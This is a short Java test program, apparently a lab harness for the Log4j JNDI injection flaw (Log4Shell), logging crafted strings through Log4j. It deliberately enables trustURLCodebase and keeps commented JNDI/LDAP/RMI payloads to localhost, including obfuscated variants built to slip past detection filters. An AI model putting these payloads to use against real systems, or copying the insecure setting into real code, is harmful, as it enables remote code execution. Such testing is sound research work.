import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class main {

    private static final Logger logger = LogManager.getLogger(main.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
//        String s = "${jndi:ldap://127.0.0.1:1389/qgjapf}";
//        String s = "${rmi://127.0.0.1:1099/rbs0cx}";
//        String s ="${${upper:jndi}:${lower:LDAP}://127.0.0.1:1389/wgjqi9}";
//        String s = "${${upper:jndi:ldap://127.0.0.1:1389/wgjqi9}}";
//        String s = "${${}jndi:ldap://127.0.0.1:1389/qgjapf}";
//        String s = "${${env:foo:-jndi}:ldap://127.0.0.1:1389/qgjapf}\n";
        String s = "${${}}";
        logger.error(s);
    }

}